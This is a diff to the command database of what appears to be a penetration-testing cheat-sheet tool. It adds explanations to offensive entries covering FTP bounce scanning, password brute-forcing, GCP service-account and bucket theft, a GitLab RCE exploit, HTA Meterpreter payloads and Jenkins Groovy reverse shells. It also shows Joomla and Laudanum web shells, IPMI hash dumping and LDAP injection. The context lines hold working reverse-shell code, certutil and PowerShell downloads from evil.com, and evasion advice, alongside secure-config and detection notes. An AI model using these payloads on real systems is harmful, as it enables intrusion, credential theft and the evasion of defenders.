       "id": "ftp-bounce",
@@ -26100,7 +26193,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# vsftpd - no bounce attack protection:\n# /etc/vsftpd.conf:\npasv_enable=YES       # PASV enabled (good)\nport_enable=YES       # PORT/active mode also enabled\n# No pasv_address set -> bounce attack possible via PORT command",
         "secure_config": "# Disable active mode (PORT command), use PASV only:\n# /etc/vsftpd.conf:\nport_enable=NO\npasv_enable=YES\npasv_min_port=30000\npasv_max_port=31000\npasv_address=<public_ip>\n# This prevents FTP bounce attacks\n# Also: disable anonymous login, enforce TLS"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Uses an FTP server as a proxy to scan a host you cannot reach directly (FTP bounce):\n  nmap -Pn -v -n -p<port>   scan this port, no discovery/DNS\n  -b <user>:<password>@<ftp_server>   the FTP relay to bounce the PORT command through\n  <internal_target>          the otherwise-unreachable host the FTP server can see\nAbuses the FTP PORT command so the server makes the connections for you - a classic way to reach an internal segment via a dual-homed FTP box."
     },
     {
       "id": "ftp-bruteforce",
@@ -26193,7 +26287,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# vsftpd - no bounce attack protection:\n# /etc/vsftpd.conf:\npasv_enable=YES       # PASV enabled (good)\nport_enable=YES       # PORT/active mode also enabled\n# No pasv_address set -> bounce attack possible via PORT command",
         "secure_config": "# Disable active mode (PORT command), use PASV only:\n# /etc/vsftpd.conf:\nport_enable=NO\npasv_enable=YES\npasv_min_port=30000\npasv_max_port=31000\npasv_address=<public_ip>\n# This prevents FTP bounce attacks\n# Also: disable anonymous login, enforce TLS"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Online password guessing against FTP with Medusa:\n  -u <user>   the username to attack\n  -P /usr/share/wordlists/rockyou.txt   password list\n  -h <ip>     the target\n  -M ftp      the FTP module\nTries each password until one works; use it after anonymous login fails and you have a candidate user (hydra ftp://<ip> does the same) - throttle to avoid lockouts."
     },
     {
       "type": "command",
@@ -26325,7 +26420,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# vsftpd - anonymous login enabled (common default):\n# /etc/vsftpd.conf:\nanonymous_enable=YES       # allows login as 'anonymous'\nanon_upload_enable=YES     # anonymous can upload files\nanon_mkdir_write_enable=YES # anonymous can create directories\nwrite_enable=YES\n# No encryption - credentials and data in cleartext (port 21)",
         "secure_config": "# vsftpd - disable anonymous, enforce encryption:\n# /etc/vsftpd.conf:\nanonymous_enable=NO        # disable anonymous login\nlocal_enable=YES\nwrite_enable=NO            # read-only by default\nchroot_local_user=YES      # jail users to their home directory\n\n# Enable FTPS (TLS):\nssl_enable=YES\nrsa_cert_file=/etc/ssl/certs/vsftpd.crt\nrsa_private_key_file=/etc/ssl/private/vsftpd.key\nforce_local_logins_ssl=YES  # require TLS for all logins\nforce_local_data_ssl=YES    # require TLS for all data transfers\nssl_tlsv1_2=YES\n\n# Better alternative: use SFTP (SSH subsystem) instead of FTP entirely:\n# sshd_config: Subsystem sftp /usr/lib/openssh/sftp-server\n# chroot via Match User block",
         "evasion": "Anonymous/valid-cred access blends in; avoid bulk downloads that spike transfer logs; pull only what you need."
-      }
+      },
+      "explain": "Enumerates an FTP service interactively:\n  ftp <ip>   open a session and try anonymous login\nOnce in, ls/ls -R to browse, get/put to test read/write, and 'status' for TLS/mode info; the card also shows raw banner grabbing with nc/telnet and TLS interaction via openssl s_client -starttls ftp."
     },
     {
       "id": "gcp-authentication",
@@ -26420,7 +26516,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Downloadable service-account keys enabled and long-lived; no MFA on users; over-privileged service accounts (Owner/Editor).",
         "vulnerable_config": "# Leaked SA key with Editor/Owner -> full access:\ngcloud auth activate-service-account --key-file leaked-sa.json   # now you are the SA",
         "secure_config": "# Org policy: constraints/iam.disableServiceAccountKeyCreation = true\n# Use Workload Identity Federation / attached SAs instead of keys; enforce 2SV;\n# least-privilege SA roles; alert on SA key usage in Cloud Audit Logs."
-      }
+      },
+      "explain": "Authenticates to Google Cloud as a compromised service account:\n  gcloud auth activate-service-account   log in as an SA\n  --key-file <sa_key>.json               the SA's JSON key\nEstablishes the gcloud session for all GCP operations; 'gcloud auth login' handles user OAuth, and 'gcloud auth list'/'config list' confirm the active identity and project."
     },
     {
       "id": "gcp-storage-exfil",
@@ -26517,7 +26614,8 @@ const COMMAND_DATA = {
         "misconfiguration": "SA keys / terraform state / .env stored in buckets; public (allUsers) buckets; overly broad storage roles; Data Access logs off.",
         "vulnerable_config": "# Over-privileged token can list + pull a key file:\ngcloud storage cp gs://devops-bucket/devops-srvacc-key.json . --access-token-file token.txt",
         "secure_config": "# Store secrets in Secret Manager, not buckets; enforce uniform bucket-level access + least privilege;\n# remove public bindings; enable Data Access audit logs; apply VPC Service Controls; run DLP on buckets."
-      }
+      },
+      "explain": "Enumerates and pulls objects from Cloud Storage buckets:\n  gcloud storage ls gs://<bucket>   list a bucket's contents\n  --access-token-file token.txt     authenticate with a stolen OAuth token (or use an activated SA)\nBuckets often hold SA key files, .env, terraform state, and backups; 'gcloud storage cp' downloads them, and a recovered SA key frequently unlocks a more privileged identity."
     },
     {
       "id": "gcp-metadata-token",
@@ -26827,7 +26925,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Basic roles granted broadly; service accounts with Owner/Editor; allUsers/allAuthenticatedUsers on resources; Data Access logs disabled (blind to enumeration).",
         "vulnerable_config": "# SA bound as Owner at project scope -> enumeration reveals the escalation target:\ngcloud projects get-iam-policy <proj> --flatten=\"bindings[].members\" --filter=\"bindings.members=serviceAccount:<sa>\" --format=\"value(bindings.role)\"  # roles/owner",
         "secure_config": "# Replace Basic roles with least-privilege predefined/custom roles;\n# remove allUsers/allAuthenticatedUsers; enable Data Access audit logs;\n# use IAM Recommender + Security Command Center to enforce least privilege."
-      }
+      },
+      "explain": "Enumerates GCP IAM, which is resource-based rather than identity-based:\n  gcloud projects get-iam-policy <project_id>   read the role bindings on a project\nYou cannot list an identity's permissions directly, so you read policies on orgs/projects/resources and enumerate service accounts; --flatten/--filter isolates a given member's roles, and 'iam service-accounts keys list' finds usable keys."
     },
     {
       "id": "gcp-iam-privesc",
@@ -27224,7 +27323,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Apply Get-WinEvent to detect DLL hijacking."
         }
-      ]
+      ],
+      "explain": "Queries a Windows event log with the fastest Get-WinEvent filter type:\n  -FilterHashtable @{LogName='<log>'; ID=<id>}   server-side filter by log and event ID (much faster than piping to Where-Object)\n  | Select-Object TimeCreated, Id, Message       keep the useful fields\n  | Format-List                                  readable output\nPulls matching events from a live log or an offline .evtx (-Path); add StartTime/EndTime to the hashtable, or use -FilterXPath for field-level conditions."
     },
     {
       "id": "ad-getnpusers",
@@ -27731,7 +27831,8 @@ const COMMAND_DATA = {
           "OWASP A06:2021"
         ],
         "evasion": "Use valid session/token auth; clean up any runner/CI job or dropped file used for execution; blend into normal CI traffic."
-      }
+      },
+      "explain": "Exploits the GitLab ExifTool/DjVu flaw for RCE (CVE-2021-22205):\n  python3 gitlab_13_10_2_rce.py   the exploit\n  -t http://<url>:8081            target\n  -u/-p                           GitLab credentials (some versions are unauthenticated)\n  -c '<reverse_shell>'            the command to run\nMalicious image metadata is passed to a vulnerable ExifTool, executing your command; give it a reverse-shell one-liner and catch it with 'nc -lnvp'."
     },
     {
       "type": "command",
@@ -27819,7 +27920,8 @@ const COMMAND_DATA = {
           "OWASP A07:2021"
         ],
         "evasion": "Use valid session/token auth; clean up any runner/CI job or dropped file used for execution; blend into normal CI traffic."
-      }
+      },
+      "explain": "Enumerates valid GitLab usernames to build a target list:\n  gitlab_userenum.sh   the enumeration script\n  --url http://<url>:8081/   the GitLab instance\n  --userlist <userlist>      candidate usernames\nConfirms which accounts exist via GitLab's sign-up/internal endpoints; check /users/sign_up for open registration and /help for the version."
     },
     {
       "type": "command",
@@ -27916,7 +28018,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Brute-forces hidden web content with gobuster:\n  gobuster dir   directory/file brute-force mode\n  -u http://<ip>/   the target base URL\n  -w <wordlist>     the wordlist of paths to try\nFinds unlinked directories and files the site does not advertise; 'gobuster dns -d <domain> -w <list>' does the same for subdomains, and -x adds file extensions."
     },
     {
       "id": "crtp-golden-ticket",
@@ -29305,7 +29408,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Group3r"
-      ]
+      ],
+      "explain": "Audits GPOs for misconfigurations and secrets:\n  group3r.exe   walk every GPO the current user can read\n  -f <output_log>   write findings to this log file\nFlags writable GPO links, weak script paths, insecure scheduled tasks, and credentials in GPP; run as a domain user and grep the log for HIGH/CRITICAL, or -s to target a specific DC."
     },
     {
       "id": "hashcat-attack-modes-masks",
@@ -30729,7 +30833,8 @@ const COMMAND_DATA = {
           "OSCP Ch06",
           "MITRE T1018"
         ]
-      }
+      },
+      "explain": "Performs DNS lookups with the host command:\n  host <domain>   forward-resolve the name to its A/AAAA records\nAdd -t mx/txt/ns for specific record types; the card also covers forward brute-forcing a subdomain wordlist and reverse PTR sweeps of an IP range to map a target's DNS."
     },
     {
       "type": "command",
@@ -30860,7 +30965,8 @@ const COMMAND_DATA = {
           "command": "sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt",
           "label": "tail"
         }
-      ]
+      ],
+      "explain": "Receives uploaded files through Nginx's WebDAV PUT method:\n  curl -T /etc/passwd                              upload this local file (-T = PUT)\n  http://localhost:9001/SecretUploadDirectory/users.txt   destination URL and saved name\nNginx (with dav_methods PUT enabled on that location) writes the body to disk, handling large/binary files more reliably than simple one-line servers."
     },
     {
       "type": "command",
@@ -30968,7 +31074,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Serves the current directory over HTTP so a target can download from you:\n  python3 -m http.server 8000   run Python's built-in web server on port 8000\nEverything in the folder becomes downloadable at http://<your-ip>:8000/; php -S, ruby -run, and uploadserver are drop-in alternatives when python is missing."
     },
     {
       "id": "hta-mshta-attack",
@@ -31072,7 +31179,8 @@ const COMMAND_DATA = {
         "misconfiguration": "mshta.exe not blocked by application control. Email gateway allows .hta attachments. No ASR rule blocking mshta child process spawning. AMSI not enforced for Internet Explorer scripting engine.",
         "vulnerable_config": "# mshta.exe not in AppLocker/WDAC deny list:\nGet-AppLockerPolicy -Effective | Where-Object {$_.Rules | Select-String 'mshta'}\n# No output → mshta.exe unrestricted\n\n# Email gateway allows .hta attachments:\n# Exchange: Get-TransportRule | Where-Object {$_.AttachmentExtensionMatchesWords -contains 'hta'}\n# No transport rule blocking .hta = attachments delivered",
         "secure_config": "# Block mshta.exe via WDAC deny rule:\n# Add path rule: deny C:\\Windows\\System32\\mshta.exe\n# Or publisher rule: deny applications published by Microsoft signed with mshta characteristics\n\n# AppLocker EXE rule:\nNew-AppLockerPolicy -RuleType Publisher -FilePath C:\\Windows\\System32\\mshta.exe -Action Deny\n\n# ASR rule (Defender):\nSet-MpPreference -AttackSurfaceReductionRules_Ids 'D4F940AB-401B-4EFC-AADC-AD5F3C50688A' -AttackSurfaceReductionRules_Actions Enabled\n# → Block Office from creating child processes\n\n# Exchange transport rule: block .hta attachments\nNew-TransportRule -Name 'Block HTA Attachments' -AttachmentExtensionMatchesWords 'hta' -RejectMessageEnhancedStatusCode '5.7.1' -RejectMessageReasonText 'HTA files are blocked'"
-      }
+      },
+      "explain": "Builds an HTA payload that Windows runs through the trusted mshta.exe:\n  msfvenom -p windows/x64/meterpreter/reverse_tcp   the payload\n  LHOST/LPORT                                       callback details\n  -f hta-psh                                        HTA-with-PowerShell format\n  -o evil.hta                                       output file\nAn .hta is HTML plus script that mshta.exe executes with full local privileges (no browser sandbox); host it, lure the user to 'mshta.exe http://<lhost>/evil.hta', and catch the shell."
     },
     {
       "id": "cdsa-m08-http-anomalies",
@@ -31533,7 +31641,8 @@ const COMMAND_DATA = {
       ],
       "tools": [
         "yara"
-      ]
+      ],
+      "explain": "Scans a Windows disk path with YARA rules to hunt for malware:\n  yara64.exe        the YARA engine\n  -s                also print the matching strings for each hit\n  rule.yar          the rule file to apply\n  C:\\Samples\\       the path to scan\n  -r                recurse into subfolders\n  2>nul             discard access-denied errors\nReports files that match the rules; the same engine scans process memory (by PID), ETW telemetry via SilkETW, and memory images through Volatility's yarascan."
     },
     {
       "id": "hydra-bruteforce",
@@ -32876,7 +32985,8 @@ const COMMAND_DATA = {
           "OWASP A05:2021"
         ],
         "evasion": "The 8.3 short-name probe is inherently noisy (many 404s) - throttle requests and target a single path prefix to reduce log volume."
-      }
+      },
+      "explain": "Recovers IIS 8.3 short file names via the tilde disclosure bug:\n  java -jar iis_shortname_scanner.jar   the scanner\n  0 5                                    request/retry timing parameters\n  http://<ip>/                           the target\nLeaks the first 6 characters of files/dirs (e.g. TRANSF~1.ASP); build a wordlist from the recovered prefix and brute-force the full names with gobuster -x .asp,.aspx."
     },
     {
       "type": "command",
@@ -32984,7 +33094,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
         "evasion": "Use valid creds; avoid rapid AUTH loops (rate-limited/alerted); read targeted mailboxes rather than bulk-pulling."
-      }
+      },
+      "explain": "Scans and identifies the mail-retrieval services:\n  sudo nmap <ip> -sV   version-detect\n  -p110,143,993,995    POP3, IMAP, and their TLS ports\n  -sC                  run default scripts\nConfirms IMAP/POP3 and TLS support; then log in with curl (IMAPS) or openssl s_client to list folders and read mail, validating any credentials you hold."
     },
     {
       "id": "ptc-dcsync",
@@ -35373,7 +35484,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
         "evasion": "The hash-retrieval flaw is a single request per BMC; avoid scanning the whole range loudly - target known BMCs."
-      }
+      },
+      "explain": "Dumps IPMI/BMC password hashes over the RAKP protocol with Metasploit:\n  use auxiliary/scanner/ipmi/ipmi_dumphashes   the module that abuses RAKP\nIPMI leaks the hash to any unauthenticated client, so setting RHOSTS and running it yields crackable hashes with no login; scan first with ipmi_version (UDP 623) and crack the output with hashcat -m 7300."
     },
     {
       "id": "iptables-packet-count",
@@ -35480,7 +35592,8 @@ const COMMAND_DATA = {
         "sources": [
           "PEN-200 Ch 6"
         ]
-      }
+      },
+      "explain": "Measures exactly how many packets an nmap scan sends and receives:\n  iptables -I INPUT 1 -s <ip> -j ACCEPT   count inbound packets from the target (rule at position 1)\n  (plus an OUTPUT rule for outbound)\n  iptables -Z                              zero the counters before the scan\nRun the scan, then read the counter columns - lets you compare the noise/footprint of different scan types (-sS vs -sT, timing templates) precisely."
     },
     {
       "id": "js-deobfuscate",
@@ -35704,7 +35817,8 @@ const COMMAND_DATA = {
       ],
       "tools": [
         "curl"
-      ]
+      ],
+      "explain": "Fetches a suspicious JavaScript file so you can deobfuscate it:\n  curl -s http://<target_ip>:<port>/secret.js   silently download the script\nHaving the raw source lets you spot the obfuscation type (minified, packed eval(function(p,a,c,k,e,d)), obfuscator.io arrays, JSFuck) and reverse it - beautify it, or replace eval( with console.log( and run it to print the real source."
     },
     {
       "type": "payload",
@@ -35801,7 +35915,8 @@ const COMMAND_DATA = {
           "label": "Windows Groovy reverse shell via Java Socket (Script Console)",
           "command": "String host=\"<lhost>\";\nint port=<lport>;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Thread.sleep(50); try{p.exitValue();break;}catch(Exception e){} }\np.destroy();s.close();"
         }
-      ]
+      ],
+      "explain": "A Groovy reverse shell for the Jenkins script console (Linux):\n  Runtime.getRuntime().exec([...])   run a shell command from Groovy\n  exec 5<>/dev/tcp/<lhost>/<lport>   open a socket to your listener and pipe a shell over it\nRuns as the Jenkins user, calling back to a netcat listener; a Windows ProcessBuilder variant spawns cmd.exe the same way."
     },
     {
       "type": "payload",
@@ -35895,7 +36010,8 @@ const COMMAND_DATA = {
           "MITRE T1059.007",
           "MITRE T1552.001"
         ]
-      }
+      },
+      "explain": "Runs an OS command from the Jenkins Groovy script console (/script):\n  def cmd = '<command>'          the command to execute\n  def proc = cmd.execute()       run it\n  consumeProcessOutput(sout,serr) + waitForOrKill   capture stdout/stderr\n  println sout                   print the result\nExecutes as the Jenkins user - instant RCE with admin (or misconfigured anonymous) access to the console; escalate from there to a full reverse shell."
     },
     {
       "id": "crtp-jenkins-abuse",
@@ -36306,7 +36422,8 @@ const COMMAND_DATA = {
         ],
         "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path.",
         "evasion": "Obfuscate the injected template webshell and remove it after; blend admin actions into normal usage; avoid leaving the malicious extension/template enabled."
-      }
+      },
+      "explain": "Reads files outside the webroot via Joomla Media Manager traversal (CVE-2019-10945):\n  python2.7 joomla_dir_trav.py   the exploit\n  --url \"http://<url>/administrator/\"   the admin base\n  --username/--password          valid admin credentials\n  --dir /                        the directory to list/read\nAuthenticated directory traversal lets you enumerate and read arbitrary files on the host - point --dir at sensitive paths to loot configs."
     },
     {
       "type": "command",
@@ -36405,7 +36522,8 @@ const COMMAND_DATA = {
           "label": "Corroborate version via Joomla stats API",
           "command": "curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool"
         }
-      ]
+      ],
+      "explain": "Detects Joomla and reads its version:\n  curl -s http://<url>/   fetch the homepage\n  | grep Joomla           spot Joomla generator/meta tags\nConfirms the CMS; then read the version from /README.txt or /administrator/manifests/files/joomla.xml, and note the /administrator login path from robots.txt."
     },
     {
       "type": "command",
@@ -36506,7 +36624,8 @@ const COMMAND_DATA = {
           "MITRE T1595.002"
         ],
         "evasion": "Obfuscate the injected template webshell and remove it after; blend admin actions into normal usage; avoid leaving the malicious extension/template enabled."
-      }
+      },
+      "explain": "Fingerprints a Joomla (or Drupal) site with droopescan:\n  droopescan scan joomla   run the Joomla plugin\n  --url http://<url>/       the target\nEnumerates version, components, and modules to guide exploitation; joomscan is the Joomla-specific alternative that also flags known vulnerabilities."
     },
     {
       "type": "payload",
@@ -36598,7 +36717,8 @@ const COMMAND_DATA = {
           "MITRE T1505.003",
           "OWASP A04:2021"
         ]
-      }
+      },
+      "explain": "Turns Joomla admin access into RCE by editing a template file:\n  system($_GET['<rand>']);   add this to a template PHP file (e.g. error.php) via Templates > Customise\nJoomla lets admins edit template source, so injecting a system() call and then requesting /templates/<theme>/error.php?<rand>=id runs commands as the web-server user."
     },
     {
       "id": "protected-2john",
@@ -37643,7 +37763,8 @@ const COMMAND_DATA = {
           "label": "Spray a password against the valid users",
           "command": "kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt '<Season2024>'"
         }
-      ]
+      ],
+      "explain": "Validates usernames via Kerberos pre-auth without locking accounts:\n  kerbrute userenum   username-guessing mode\n  -d <domain>         target domain\n  --dc <dc_ip>        the KDC to ask\n  <userlist>          candidate names\n  -o valid_users.txt  save the confirmed accounts\nThe KDC answers differently for real vs unknown users (no bad-password count incremented), so you build a verified user list safely; feed it to a controlled password spray."
     },
     {
       "type": "command",
@@ -38162,7 +38283,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Build Kibana dashboards on top of KQL queries."
         }
-      ]
+      ],
+      "explain": "The Kibana Query Language pattern for filtering Elastic SIEM events:\n  field:value              match a field to a value (e.g. event.code:4625)\n  AND field2:value2        both conditions must hold\n  NOT field3:value3        exclude matches of this condition\nUsed in Discover and dashboards to hunt events; wildcards (user.name: admin*) and @timestamp ranges narrow the hunt further."
     },
     {
       "type": "command",
@@ -38871,7 +38993,8 @@ const COMMAND_DATA = {
           "command": "# Upload demo.aspx via file upload vulnerability\n# Navigate to: http://<target>/uploads/demo.aspx\n# Shell only responds from allowedIps",
           "label": "Upload demo.aspx via file upload v…"
         }
-      ]
+      ],
+      "explain": "Deploys a prebuilt Laudanum web shell to the target:\n  cp /usr/share/laudanum/aspx/shell.aspx <name>.aspx   copy the right-language shell (asp/aspx/jsp/php)\nEdit the allowedIps list inside it to your IP, upload it, and browse to it for command execution; Laudanum ships shells for each platform so you pick the one matching the app."
     },
     {
       "id": "lazagne-run",
@@ -39066,7 +39189,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "OWASP A03:2021"
         ]
-      }
+      },
+      "explain": "Bypasses an LDAP-backed login by injecting a wildcard:\n  Username: *   matches any account entry\n  Password: *   matches any password value\nIf the login builds a filter like (&(sAMAccountName=$user)(userPassword=$pass)), the * makes the filter match any entry and authentication succeeds; test * (and other LDAP metacharacters) in each field."
     },
     {
       "id": "ad-ldapdomaindump",
@@ -39180,7 +39304,8 @@ const COMMAND_DATA = {
           "label": "Open the HTML or grep the .grep files for quick wins",
           "command": "xdg-open loot/domain_users.html ; grep -i pass loot/domain_users.grep"
         }
-      ]
+      ],
+      "explain": "Dumps the whole directory over LDAP into browsable files:\n  sudo ldapdomaindump   the collector\n  -u '<domain>\\<user>' -p '<password>'   credentials\n  <dc_ip>               the DC to query\n  -o loot/              output directory\nProduces HTML plus JSON and greppable .grep files for users, groups, computers, policy, and trusts - an offline, searchable snapshot; open the HTML or grep the .grep files for 'pass'."
     },
     {
       "id": "ad-ldapsearch-users",
@@ -39272,7 +39397,8 @@ const COMMAND_DATA = {
           "label": "ldapsearch-ad.py - automated LDAP enum (all)",
           "command": "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p <password> -t all"
         }
-      ]
+      ],
+      "explain": "Enumerates user accounts over LDAP:\n  ldapsearch -h <dc_ip> -x   query the DC with a simple bind\n  -b \"<base_dn>\" -s sub      search the whole domain subtree\n  \"(&(objectCategory=person)(objectClass=user))\"   filter to real users (not machine accounts)\n  | grep sAMAccountName      extract the login names\nGives a clean username list for kerbrute or spraying; add -D '<user>@<domain>' -w '<password>' for an authenticated bind when anonymous is disabled."
     },
     {
       "id": "ad-ldapsearch-pwpolicy",
@@ -39361,7 +39487,8 @@ const COMMAND_DATA = {
           "label": "Just the lockout/length fields",
           "command": "ldapsearch -h <dc_ip> -x -b \"<base_dn>\" -s sub \"*\" | grep -iE 'minPwdLength|lockoutThreshold|maxPwdAge'"
         }
-      ]
+      ],
+      "explain": "Reads the password policy over raw LDAP:\n  ldapsearch -h <dc_ip>   the DC\n  -x                      simple (anonymous or basic) authentication\n  -b \"<base_dn>\"          search base (the domain DN)\n  -s sub \"*\"              subtree scope, all attributes\n  | grep -A 20 pwdHistoryLength   pull the policy attributes out\nGets lockout threshold, history, and complexity so you can plan spraying; add -D/-W for an authenticated bind."
     },
     {
       "type": "command",
@@ -41178,7 +41305,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Flat network with no east-west segmentation and unrestricted outbound TLS lets a DMZ/pivot host route the attacker straight into internal subnets.",
         "vulnerable_config": "# Pivot can reach internal subnets AND has unrestricted outbound 443:\niptables -L OUTPUT   # policy ACCEPT\n# -> ./agent -connect attacker:443 -ignore-cert ; attacker: ip route add 10.10.20.0/24 dev ligolo\n# attacker now has native routed access to 10.10.20.0/24",
         "secure_config": "# Egress filtering: block outbound 443 except to known destinations via an inspecting proxy\niptables -P OUTPUT DROP\niptables -A OUTPUT -p tcp --dport 443 -d <corp_proxy> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n# Segment DMZ from internal tiers; alert on long-lived outbound TLS from servers;\n# application allowlisting to block unsigned/unknown agent binaries."
-      }
+      },
+      "explain": "Connects the Ligolo-ng agent on a compromised pivot back to your proxy, creating a virtual TUN interface locally:\n  ./agent          the implant run on the pivot\n  -connect <attacker_ip>:11601   dial back to the proxy you started with -selfcert\n  -ignore-cert     accept the proxy's self-signed TLS cert\nAfter 'session' + a route to the subnet via the ligolo interface + 'start', you reach the internal network with normal tools - no proxychains."
     },
     {
       "id": "linux-unshadow",
@@ -41501,7 +41629,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
